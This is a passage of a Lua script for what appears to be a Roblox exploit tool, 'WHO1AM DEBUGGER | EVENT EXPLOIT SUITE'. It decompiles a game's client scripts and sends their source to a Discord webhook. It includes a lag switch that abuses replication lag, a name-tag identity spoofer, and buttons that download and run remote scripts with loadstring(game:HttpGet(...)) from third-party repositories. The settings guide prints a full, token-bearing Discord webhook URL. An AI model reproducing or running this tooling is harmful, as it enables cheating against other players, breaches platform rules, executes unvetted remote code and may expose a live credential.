                 SendToDiscord("📋 EVENT PATH COPIED (FORCE)", "Path: `" .. path .. "`\nType: `" .. item.Type .. "`\n\n🔍 Searching for associated script...", 16753920)
                 
                 -- Search for referencing scripts
                 local foundScript, foundSrc = nil, nil
                 
                 for s, src in pairs(GlobalScriptCache) do
                    if src:find(item.Obj.Name) then foundScript, foundSrc = s, src; break end
                 end
                 
                 if not foundScript then
                     local scripts = (getrunningscripts and getrunningscripts()) or game:GetService("Players").LocalPlayer:GetDescendants()
                     for _, s in pairs(scripts) do
                         if s:IsA("LocalScript") or s:IsA("ModuleScript") then
                             if not GlobalScriptCache[s] then
                                 local success, src = pcall(function() return decompile(s) end)
                                 if success and src then
                                     GlobalScriptCache[s] = src
                                     if src:find(item.Obj.Name) then foundScript, foundSrc = s, src; break end
                                 end
                                 task.wait()
                             end
                         end
                     end
                 end
                 
                 if foundScript then
                     SendFileToDiscord("🔗 SCRIPT FOUND", "Script: `" .. foundScript:GetFullName() .. "`\nThis script references the event!", 65280, foundScript.Name .. ".lua", foundSrc)
                 else
                     SendToDiscord("❌ NO SCRIPT FOUND", "Could not find any active script referencing `" .. item.Obj.Name .. "` in the source code.", 16711680)
                 end
             end)
             
             task.wait(1)
             btn.Text = "  " .. icon .. " " .. item.Obj.Name .. " [" .. item.Type .. "]"
        end)
    end
    
    ScanEvtBtn.Text = "☠️ SCAN EVENTS (" .. #ScannedObjects .. ")"
end)

    DumpEvtBtn.MouseButton1Click:Connect(function()
    if #ScannedObjects == 0 then
        DumpEvtBtn.Text = "⚠️ Scan First!"
        task.wait(1)
        DumpEvtBtn.Text = "💾 DUMP & ANALYZE ALL"
        return
    end
    
    DumpEvtBtn.Text = "⏳ PREPARING..."
    
    task.spawn(function()
        -- PHASE 1: BUILD SCRIPT CACHE (THE FIX)
        local ScriptCache = {}
        local scriptsToScan = FoundScripts
        if #scriptsToScan == 0 and getrunningscripts then 
            scriptsToScan = getrunningscripts() 
        end
        
        local totalScripts = #scriptsToScan
        DumpEvtBtn.Text = "⏳ CACHING SCRIPTS (0/" .. totalScripts .. ")"
        
        for idx, s in pairs(scriptsToScan) do
            if not s or not s.Parent then continue end
            DumpEvtBtn.Text = "⏳ CACHING (" .. idx .. "/" .. totalScripts .. ")"
            UpdateConsoleProgress(idx, totalScripts, "Phase 1: Script Caching")
            
            -- Decompile ONCE per script
            local success, src = pcall(function() return decompile(s) end)
            if success and src then
                ScriptCache[s] = src
            end
            
            task.wait() -- Yield every single iteration to prevent freeze
            if idx % 50 == 0 then 
                pcall(function() 
                    if gcinfo then gcinfo() end 
                    if collectgarbage then collectgarbage("count") end
                end)
            end
        end

        -- PHASE 2: ANALYZE EVENTS
        DumpEvtBtn.Text = "⏳ ANALYZING EVENTS..."
        task.wait(0.5)
        
        local Buffer = {}
        table.insert(Buffer, GenerateDarkHeader("WHO1AM DEBUGGER | EVENT EXPLOIT SUITE"))
        table.insert(Buffer, "DATE: " .. os.date())
        table.insert(Buffer, "GAME ID: " .. game.PlaceId)
        table.insert(Buffer, "TOTAL TARGETS: " .. #ScannedObjects)
        table.insert(Buffer, "SCRIPTS SCANNED: " .. totalScripts .. "\n\n")
        
        for i, item in pairs(ScannedObjects) do
            DumpEvtBtn.Text = "⏳ Analyzing " .. i .. "/" .. #ScannedObjects
            UpdateConsoleProgress(i, #ScannedObjects, "Phase 2: Event Analysis")
            task.wait() -- Yield every single iteration
            
            table.insert(Buffer, "\n" .. GenerateDarkHeader("TARGET #" .. i .. ": " .. item.Obj.Name))
            table.insert(Buffer, "TYPE: " .. item.Type)
            table.insert(Buffer, "PATH: " .. item.Obj:GetFullName())
            
            -- Cross Reference using Cache (FAST)
            local success, refs = pcall(FindReferencingScripts, item.Obj, ScriptCache)
            if success and refs and #refs > 0 then
                table.insert(Buffer, "\n[+] LINKED SCRIPTS FOUND: " .. #refs)
                for _, ref in pairs(refs) do
                    table.insert(Buffer, GenerateDarkSection("SCRIPT: " .. ref.Script.Name))
                    table.insert(Buffer, "PATH: " .. ref.Script:GetFullName())
                    table.insert(Buffer, "↓↓↓ DECOMPILED SOURCE ↓↓↓")
                    table.insert(Buffer, "--------------------------------------------------")
                    table.insert(Buffer, ref.Source)
                    table.insert(Buffer, "--------------------------------------------------")
                end
            else
                 table.insert(Buffer, "\n[-] NO DIRECT SCRIPT REFERENCES FOUND")
            end
            
            table.insert(Buffer, "\n" .. string.rep("═", 60) .. "\n")
        end
        
        -- Finalize
        table.insert(Buffer, "\n\n" .. GetAsciiArt()) -- Append ASCII Art explicitly
        local Log = table.concat(Buffer, "\n")
        local FileName = "{EVENTS} GAME ID " .. game.PlaceId .. ".txt"
        writefile(FileName, Log)
        
        -- Send Notification to Discord (Don't upload file)
        if SendToDiscord then
            if GlobalConfig.WebhookURL and GlobalConfig.WebhookURL:find("http") then
                DumpEvtBtn.Text = "📤 NOTIFYING DISCORD..."
                task.spawn(function()
                    SendToDiscord("� MASS DUMP COMPLETE", "The analysis file is too large to send via Webhook.\n\n📁 **Saved to Workspace:**\n`" .. FileName .. "`\n\n✅ **Status:** Saved Locally", 16776960)
                end)
                task.wait(1.5)
                DumpEvtBtn.Text = "✅ DUMP SAVED LOCALLY!"
            else
                DumpEvtBtn.Text = "⚠️ SAVED (NO WEBHOOK)"
                task.wait(1.5)
            end
        else
            DumpEvtBtn.Text = "✅ DUMP SAVED!"
        end
        
        task.wait(2)
        DumpEvtBtn.Text = "💾 DUMP & ANALYZE ALL"
    end)
end)


-- ============================================================================
-- ⚙️ TAB 4: SETTINGS
-- ============================================================================
local Settings = Win:Tab("Settings", "⚙️", 4)

local WebLabel = Instance.new("TextLabel")
WebLabel.Text = "Discord Webhook URL"
WebLabel.Size = UDim2.new(1, -40, 0, 20)
WebLabel.Position = UDim2.new(0, 20, 0, 10)
WebLabel.BackgroundTransparency = 1
WebLabel.TextColor3 = UIConfig.Colors.SubText
WebLabel.Font = Enum.Font.GothamBold
WebLabel.TextSize = 12
WebLabel.TextXAlignment = Enum.TextXAlignment.Left
WebLabel.Parent = Settings

local WebInput = Instance.new("TextBox")
WebInput.Text = GlobalConfig.WebhookURL
WebInput.PlaceholderText = "Paste Discord Webhook URL to enable logging..."
WebInput.Size = UDim2.new(1, -40, 0, 40)
WebInput.Position = UDim2.new(0, 20, 0, 35)
WebInput.BackgroundColor3 = UIConfig.Colors.Card
WebInput.TextColor3 = UIConfig.Colors.Text
WebInput.Font = Enum.Font.Code
WebInput.TextSize = 11
WebInput.TextWrapped = true
WebInput.Parent = Settings
Instance.new("UICorner", WebInput).CornerRadius = UDim.new(0, 8)

WebInput.FocusLost:Connect(function()
    if WebInput.Text:find("discord") then
        GlobalConfig.WebhookURL = WebInput.Text
        writefile(ConfigFile, HttpService:JSONEncode({WebhookURL = WebInput.Text}))
        SendToDiscord("✅ CONFIG", "Webhook Updated Successfully.", 0)
        WebInput.TextColor3 = UIConfig.Colors.GreenStart
        task.wait(1)
        WebInput.TextColor3 = UIConfig.Colors.Text
    end
end)

local TestBtn = Instance.new("TextButton")
TestBtn.Text = "Test Webhook"
TestBtn.Size = UDim2.new(1, -40, 0, 40)
TestBtn.Position = UDim2.new(0, 20, 0, 85)
TestBtn.BackgroundColor3 = UIConfig.Colors.Card
TestBtn.TextColor3 = UIConfig.Colors.Text
TestBtn.Font = Enum.Font.GothamBold
TestBtn.TextSize = 14
TestBtn.Parent = Settings
Instance.new("UICorner", TestBtn).CornerRadius = UDim.new(0, 8)

TestBtn.MouseButton1Click:Connect(function()
    SendToDiscord("🧪 TEST", "System Check: Online", 0)
end)

-- Identity Spoofer (New Feature)
local SpooferLabel = Instance.new("TextLabel")
SpooferLabel.Text = "Identity Spoofer (Local-Side Only)"
SpooferLabel.Size = UDim2.new(1, -40, 0, 20)
SpooferLabel.Position = UDim2.new(0, 20, 0, 140)
SpooferLabel.BackgroundTransparency = 1
SpooferLabel.TextColor3 = UIConfig.Colors.SubText
SpooferLabel.Font = Enum.Font.GothamBold
SpooferLabel.TextSize = 12
SpooferLabel.TextXAlignment = Enum.TextXAlignment.Left
SpooferLabel.Parent = Settings

local SpooferBtn = Instance.new("TextButton")
SpooferBtn.Text = "🎭 Spoof Identity: D4rk-TR43"
SpooferBtn.Size = UDim2.new(1, -40, 0, 40)
SpooferBtn.Position = UDim2.new(0, 20, 0, 165)
SpooferBtn.BackgroundColor3 = Color3.fromRGB(45, 20, 45) -- Purple tint
SpooferBtn.TextColor3 = Color3.fromRGB(200, 150, 255)
SpooferBtn.Font = Enum.Font.GothamBold
SpooferBtn.TextSize = 14
SpooferBtn.Parent = Settings
Instance.new("UICorner", SpooferBtn).CornerRadius = UDim.new(0, 8)

local Spoofed = false
SpooferBtn.MouseButton1Click:Connect(function()
    if Spoofed then return end
    Spoofed = true
    
    local TargetName = "👾 D4rk-TR43 👾"
    local TargetDisplayName = "👾 D4rk-TR43 👾"
    
    -- Function to apply name
    local function ApplySpoof(char)
        if not char then return end
        
        -- Method 1: Humanoid DisplayName (Standard)
        local h = char:WaitForChild("Humanoid", 5)
        if h then 
            h.DisplayName = TargetDisplayName
        end
        
        -- Method 2: Fake Head UI (Aggressive Overlay)
        -- We create a fake billboard because some games disable DisplayName or use custom systems.
        local head = char:WaitForChild("Head", 5)
        if head then
            -- A. Hide tags inside Character hierarchy (Head, RootPart, etc)
            for _, v in pairs(char:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name ~= "SpoofedTag" then
                    v.Enabled = false
                end
            end
            
            -- B. Hide tags in PlayerGui that are attached to us (Adornee)
            local pg = LocalPlayer:FindFirstChild("PlayerGui")
            if pg then
                for _, v in pairs(pg:GetDescendants()) do
                    if v:IsA("BillboardGui") and v.Name ~= "SpoofedTag" then
                        if v.Adornee and v.Adornee:IsDescendantOf(char) then
                            v.Enabled = false
                        end
                    end
                end
            end
            
            -- Create our own Fake Name Tag
            local FakeTag = head:FindFirstChild("SpoofedTag")
            if not FakeTag then
                FakeTag = Instance.new("BillboardGui")
                FakeTag.Name = "SpoofedTag"
                FakeTag.Adornee = head
                FakeTag.Size = UDim2.new(0, 200, 0, 50)
                FakeTag.StudsOffset = Vector3.new(0, 2, 0)
                FakeTag.AlwaysOnTop = true
                FakeTag.Parent = head
                
                local NameLabel = Instance.new("TextLabel")
                NameLabel.Size = UDim2.new(1, 0, 1, 0)
                NameLabel.BackgroundTransparency = 1
                NameLabel.Text = TargetDisplayName
                NameLabel.TextColor3 = Color3.new(1, 1, 1)
                NameLabel.TextStrokeTransparency = 0
                NameLabel.Font = Enum.Font.GothamBold
                NameLabel.TextSize = 14
                NameLabel.Parent = FakeTag
            else
                FakeTag.Enabled = true -- Ensure ours is visible
            end
        end
    end

    -- Apply Immediately
    ApplySpoof(LocalPlayer.Character)
    
    -- Apply on Respawn
    LocalPlayer.CharacterAdded:Connect(ApplySpoof)
    
    -- Loop to maintain (Aggressive)
    task.spawn(function()
        while task.wait(1) do
            if LocalPlayer.Character then
                 -- Force Humanoid Name
                local h = LocalPlayer.Character:FindFirstChild("Humanoid")
                if h and h.DisplayName ~= TargetDisplayName then
                    h.DisplayName = TargetDisplayName
                end
                
                -- Ensure Fake Tag Exists
                local head = LocalPlayer.Character:FindFirstChild("Head")
                if head and not head:FindFirstChild("SpoofedTag") then
                     ApplySpoof(LocalPlayer.Character)
                end
            end
        end
    end)
    
    -- 4. Notify User
    SpooferBtn.Text = "✅ Identity Spoofed: " .. TargetName
    SpooferBtn.BackgroundColor3 = UIConfig.Colors.GreenStart
    SpooferBtn.TextColor3 = Color3.new(0,0,0)
    
    Win:Notify("Spoofer Active", "You are now visually 'D4rk-TR43'", 4)
end)

-- How To Guide (Scrollable)
local GuideLabel = Instance.new("TextLabel")
GuideLabel.Text = "❓ HOW TO USE THE LOGGER"
GuideLabel.Size = UDim2.new(1, -40, 0, 20)
GuideLabel.Position = UDim2.new(0, 20, 0, 215)
GuideLabel.BackgroundTransparency = 1
GuideLabel.TextColor3 = UIConfig.Colors.GreenStart
GuideLabel.Font = Enum.Font.GothamBold
GuideLabel.TextSize = 12
GuideLabel.TextXAlignment = Enum.TextXAlignment.Left
GuideLabel.Parent = Settings

local GuideScroll = Instance.new("ScrollingFrame")
GuideScroll.Size = UDim2.new(1, -40, 1, -240) -- Fill remaining space
GuideScroll.Position = UDim2.new(0, 20, 0, 240)
GuideScroll.BackgroundTransparency = 0.5
GuideScroll.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
GuideScroll.BorderSizePixel = 0
GuideScroll.Parent = Settings
GuideScroll.ScrollBarThickness = 4
Instance.new("UICorner", GuideScroll).CornerRadius = UDim.new(0, 6)

local GLayout = Instance.new("UIListLayout", GuideScroll)
GLayout.Padding = UDim.new(0, 5)
GLayout.SortOrder = Enum.SortOrder.LayoutOrder

local function AddStep(text, color)
    local L = Instance.new("TextLabel")
    L.Text = text
    L.Size = UDim2.new(1, -10, 0, 0)
    L.AutomaticSize = Enum.AutomaticSize.Y
    L.BackgroundTransparency = 1
    L.TextColor3 = color or UIConfig.Colors.SubText
    L.Font = Enum.Font.Code
    L.TextSize = 11
    L.TextXAlignment = Enum.TextXAlignment.Left
    L.TextWrapped = true
    L.Parent = GuideScroll
    
    -- Padding wrapper logic simplified by just using TextLabel padding if needed, 
    -- but here we just rely on the label itself.
    -- Add a small invisible frame for left padding effect or just space in text.
    L.Text = " " .. text
end

AddStep("1. GO TO DISCORD")
AddStep("2. CREATE A DISCORD SERVER")
AddStep("3. GO TO EDIT CHANNEL ⚙️ WHERE U WANT TO GET THE LOGS")
AddStep("4. GO TO INTEGRATIONS, TAP WEBHOOKS")
AddStep("5. COPY THE BOT WEBHOOK URL")
AddStep("EXAMPLE 🔽", UIConfig.Colors.GreenStart)
AddStep("https://discordapp.com/api/webhooks/1471202955893855966/qCtGG7KaCts3n7SoyOzJD9Oe90e7lKDwWrrrx-mt52_hhunVXxmbWW35ij3ei-y0e-HqX", Color3.fromRGB(100, 100, 255))

-- ============================================================================
-- 🛠️ TAB 5: DEBUGGERS (MOVED TO END)
-- ============================================================================
local Debuggers = Win:Tab("Debuggers", "💻", 5)

local DebugContainer = Instance.new("ScrollingFrame")
DebugContainer.Size = UDim2.new(1, -40, 1, -20)
DebugContainer.Position = UDim2.new(0, 20, 0, 10)
DebugContainer.BackgroundTransparency = 1
DebugContainer.BorderSizePixel = 0
DebugContainer.ScrollBarThickness = 4
DebugContainer.ScrollBarImageColor3 = UIConfig.Colors.SubText
DebugContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
DebugContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
DebugContainer.Parent = Debuggers

local DList = Instance.new("UIListLayout", DebugContainer)
DList.Padding = UDim.new(0, 10)
DList.SortOrder = Enum.SortOrder.LayoutOrder

-- Fallback for executors that don't support AutomaticCanvasSize
DList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    DebugContainer.CanvasSize = UDim2.new(0, 0, 0, DList.AbsoluteContentSize.Y + 20)
end)

-- Helper for Debug Buttons
local function AddDebugBtn(text, urlOrFunc)
    local Btn = Instance.new("TextButton")
    Btn.Text = text
    Btn.Size = UDim2.new(1, 0, 0, 40)
    Btn.BackgroundColor3 = UIConfig.Colors.Card
    Btn.TextColor3 = UIConfig.Colors.Text
    Btn.Font = Enum.Font.GothamBold
    Btn.TextSize = 14
    Btn.Parent = DebugContainer
    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 8)
    
    Btn.MouseButton1Click:Connect(function()
        Btn.Text = "⏳ Loading..."
        task.spawn(function()
            pcall(function()
                if type(urlOrFunc) == "function" then
                    urlOrFunc()
                else
                    loadstring(game:HttpGet(urlOrFunc))()
                end
            end)
            Btn.Text = "✅ Loaded!"
            task.wait(2)
            Btn.Text = text
        end)
    end)
end

-- Add All Debuggers
-- [EXTENDED DEBUGGER LIST FROM BUSCANDO.TXT]

AddDebugBtn("Infinite Yield", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")

AddDebugBtn("Dark Dex (Explorer)", "https://raw.githubusercontent.com/infyiff/backup/main/dex.lua")
-- Note: For mobile support, we'd use: https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/Dex/Mobile%20Dex%20Explorer.txt

AddDebugBtn("SimpleSpy V3", "https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua")
-- Note: For mobile support: https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/SimpleSpyV3/mobilemain.lua

AddDebugBtn("Hydroxide", function()
    local owner = "Upbolt"
    local branch = "revision"

    local function webImport(file)
        return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
    end

    webImport("init")
    webImport("ui/main")
end)

AddDebugBtn("HttpSpy", "https://raw.githubusercontent.com/yofriendfromschool1/Httpspy/main/httpspy.txt")

AddDebugBtn("Game Tool Giver", "https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/gametoolgiver.lua")

AddDebugBtn("Game Tool Equipper", "https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/gametoolequipper.lua")

AddDebugBtn("Game UI/Frame Viewer", "https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/gameuigiver.lua")

AddDebugBtn("Remote FireServer GUI", "https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/gameremotefireserver.lua")

AddDebugBtn("Remote InvokeClient GUI", "https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/gameremoteinvokeclient.lua")

AddDebugBtn("Remote InvokeServer GUI", "https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/gameinvokeserver.lua")

AddDebugBtn("Audio Logger", "https://raw.githubusercontent.com/infyiff/backup/main/audiologger.lua")

AddDebugBtn("Subplace Viewer", "https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/subplaceviewer.txt")

AddDebugBtn("Mobile Console", "https://raw.githubusercontent.com/yofriendfromschool1/debugnation/main/decompilers%20and%20debugging/Console%20UI.lua")

AddDebugBtn("Cobalt Debugger", "https://raw.githubusercontent.com/notpoiu/cobalt/main/main.lua")

AddDebugBtn("🔥 WH01AM Lag Switch", function()
    -- Lag Switch Logic
    local LS = {}
    local Services = {
        Players = game:GetService("Players"),
        UserInputService = game:GetService("UserInputService"),
        RunService = game:GetService("RunService"),
        NetworkClient = game:GetService("NetworkClient")
    }
    
    local LocalPlayer = Services.Players.LocalPlayer
    local ToggleKey = Enum.KeyCode.X
    local IsLagging = false
    
    -- Visual Indicator
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "WH01AM_LagSwitch"
    -- Protect GUI if possible
    if syn and syn.protect_gui then 
        syn.protect_gui(ScreenGui) 
        ScreenGui.Parent = game:GetService("CoreGui") 
    elseif gethui then 
        ScreenGui.Parent = gethui() 
    else 
        ScreenGui.Parent = game:GetService("CoreGui") 
    end
    
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(0, 220, 0, 60)
    Frame.Position = UDim2.new(0.5, -110, 0.1, 0)
    Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Frame.BorderSizePixel = 0
    Frame.Parent = ScreenGui
    
    local Corner = Instance.new("UICorner", Frame)
    Corner.CornerRadius = UDim.new(0, 10)
    
    local Status = Instance.new("TextLabel")
    Status.Size = UDim2.new(1, 0, 0.6, 0)
    Status.Position = UDim2.new(0,0,0.2,0)
    Status.BackgroundTransparency = 1
    Status.Text = "LAG SWITCH: OFF"
    Status.TextColor3 = Color3.fromRGB(0, 255, 100)
    Status.Font = Enum.Font.GothamBlack
    Status.TextSize = 18
    Status.Parent = Frame

    local KeyHint = Instance.new("TextLabel")
    KeyHint.Size = UDim2.new(1, 0, 0.3, 0)
    KeyHint.Position = UDim2.new(0,0,0.7,0)
    KeyHint.BackgroundTransparency = 1
    KeyHint.Text = "[Press 'X' to Toggle]"
    KeyHint.TextColor3 = Color3.fromRGB(150, 150, 150)
    KeyHint.Font = Enum.Font.Code
    KeyHint.TextSize = 12
    KeyHint.Parent = Frame
    
    local Stroke = Instance.new("UIStroke", Frame)
    Stroke.Color = Color3.fromRGB(0, 255, 100)
    Stroke.Thickness = 2
    
    -- The Switch Logic
    local function SetLag(state)
        IsLagging = state
        if IsLagging then
            Status.Text = "🔴 CONNECTION SEVERED"
            Status.TextColor3 = Color3.fromRGB(255, 50, 50)
            Stroke.Color = Color3.fromRGB(255, 50, 50)
            
            -- Method: IncomingReplicationLag abuse
            if settings() and settings().Network then
                settings().Network.IncomingReplicationLag = 100000 -- Massive lag
            end
        else
            Status.Text = "LAG SWITCH: OFF"
            Status.TextColor3 = Color3.fromRGB(0, 255, 100)
            Stroke.Color = Color3.fromRGB(0, 255, 100)
            
            if settings() and settings().Network then
                settings().Network.IncomingReplicationLag = 0
            end
        end
    end
    
    Services.UserInputService.InputBegan:Connect(function(input, gp)
        if not gp and input.KeyCode == ToggleKey then
            SetLag(not IsLagging)
        end
    end)
    
    -- Draggable
    local Dragging, DragInput, DragStart, StartPos
    Frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            Dragging = true
            DragStart = input.Position
            StartPos = Frame.Position
            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then Dragging = false end end)
        end
    end)
    Frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and Dragging then
            local delta = input.Position - DragStart
            Frame.Position = UDim2.new(StartPos.X.Scale, StartPos.X.Offset + delta.X, StartPos.Y.Scale, StartPos.Y.Offset + delta.Y)
        end
    end)
    
    -- Close Button
    local Close = Instance.new("TextButton")
    Close.Size = UDim2.new(0, 20, 0, 20)
    Close.Position = UDim2.new(1, -25, 0, 5)
    Close.BackgroundTransparency = 1
    Close.Text = "X"
    Close.TextColor3 = Color3.fromRGB(255, 255, 255)
    Close.Parent = Frame
    Close.MouseButton1Click:Connect(function()
        SetLag(false) -- Ensure lag is off before closing
        ScreenGui:Destroy()
    end)
end)

-- [END EXTENDED LIST]


-- INIT
SendToDiscord("🟢 SYSTEM ONLINE", "WHO1AM DEBUGGER v7.0 (Ultimate Hidden) Loaded.", 0)
